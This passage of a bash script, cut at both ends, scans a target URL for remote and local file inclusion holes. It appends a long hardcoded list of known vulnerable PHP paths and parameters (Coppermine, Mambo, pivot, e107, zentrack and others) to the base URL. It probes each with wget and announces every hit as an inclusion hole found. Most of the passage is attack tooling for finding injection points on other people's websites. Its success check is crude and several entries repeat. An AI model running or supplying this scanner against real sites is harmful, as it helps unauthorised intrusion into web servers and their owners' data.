                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/mod_mainmenu.php?mosConfig_absolute_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/pivot/modules/module_db.php?pivot_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/4nAlbum/public/displayCategory.php?basepath="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/derniers_commentaires.php?rep="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/coppermine/themes/default/theme.php?THEME_DIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/coppermine/include/init.inc.php?CPG_M_DIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/coppermine/themes/coppercop/theme.php?THEME_DIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/coppermine/themes/maze/theme.php?THEME_DIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/allmylinks/include/footer.inc.php?_AMLconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/allmylinks/include/info.inc.php?_AMVconfig[cfg_serverpath]="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/myPHPCalendar/admin.php?cal_dir="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/agendax/addevent.inc.php?agendax_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/mod_mainmenu.php?mosConfig_absolute_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/xoopsgallery/upgrade_album.php?GALLERY_BASEDIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/default.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?action="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index1.php?p="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index2.php?x="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index2.php?content="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d=""
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?conteudo="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?cat="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/include/new-visitor.inc.php?lvc_include_dir="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/agendax/addevent.inc.php?agendax_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/shoutbox/expanded.php?conf="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/modules/xgallery/upgrade_album.php?GALLERY_BASEDIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/pivot/modules/module_db.php?pivot_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/library/editor/editor.php?root="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="
/library/lib.php?root="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/e107/e107_handlers/secure_img_render.php?p="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/zentrack/index.php?configFile="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?x="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/becommunity/community/index.php?pageurl="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/GradeMap/index.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index4.php?body="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/side/index.php?side="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/es/index.php?action="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?sec="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?main="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?sec="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?menu="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/html/page.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/page.php?view="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?menu="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?view="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/content.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?x="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main_site.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?L2="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include" 
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/content.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/index.php?x="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/main_site.php?page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > remote file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
               echo "-----------------------------------------------------------------------"
fi
 
d="/act="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/acion="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/action="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/API_HOME_DIR="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/board="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cat="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/client_id="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cmd="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/cont="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/current_frame="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/date="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/detail="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/dir="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/display="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/download="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/f="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/file="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/fileinclude="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 

d="/filename="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/firm_id="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/g="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/getdatd="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/go="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/HT="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/idd="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/inc="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/incfile="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/incl="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/include_file="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/include_path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/infile="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/info="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/ir="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/lang="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/language="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/link="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/load="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/main="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/mainspot="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/msg="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/num="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/openfile="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/p="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/page="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/pagind="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/path="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/path_to_calendar="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/pg="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/plik"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/qry_str="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/rutd="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/safehtml="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/section="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/showfile="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/side="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
